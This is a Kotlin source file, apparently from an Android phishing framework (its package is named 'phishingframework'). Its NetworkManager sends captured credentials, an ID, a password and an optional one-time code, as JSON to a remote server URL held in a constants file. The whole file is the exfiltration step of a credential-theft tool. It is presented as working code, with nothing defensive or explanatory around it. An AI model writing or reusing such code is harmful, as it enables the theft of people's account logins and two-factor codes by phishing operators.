package com.example.phishingframework.network

import com.example.phishingframework.models.Credentials
import com.example.phishingframework.utils.Constants
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

object NetworkManager {
    private val client = OkHttpClient()

    fun sendCredentials(
        credentials: Credentials,
        onSuccess: () -> Unit,
        onFailure: (Exception) -> Unit
    ) {
        val json = JSONObject().apply {
            put("id", credentials.id)
            put("password", credentials.password)
            if (credentials.code.isNotEmpty()) {
                put("code", credentials.code)
            }
        }

        val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
        val request = Request.Builder()
            .url(Constants.SERVER_URL)
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                onFailure(e)
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    onSuccess()
                } else {
                    onFailure(Exception("Server error: ${response.code}"))
                }
                response.close()
            }
        })
    }
}